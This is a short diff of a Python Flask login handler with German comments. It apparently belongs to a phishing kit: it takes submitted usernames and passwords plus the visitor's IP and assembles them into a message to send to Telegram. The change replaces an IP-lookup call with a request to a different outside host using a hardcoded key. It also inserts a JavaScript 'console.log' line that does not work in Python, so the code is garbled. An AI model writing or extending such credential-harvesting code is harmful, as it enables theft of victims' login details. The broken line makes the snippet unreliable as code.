@@ -263,7 +263,8 @@ def login():
     password = request.args.get('password')
     ip = request.remote_addr
     # IP-Daten von ip-api.com abrufen
-    response = requests.get(f"http://ip-api.com/json/{ip}")
+    response = requests.get(f"https://beta.browser.lol/api?ip={ip}&key=0An2xa2xGKbIv89F")
+    console.log(response)
     ip_data = response.json()
     # Nachricht an Telegram senden
     message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nIP-Data: {ip_data}"
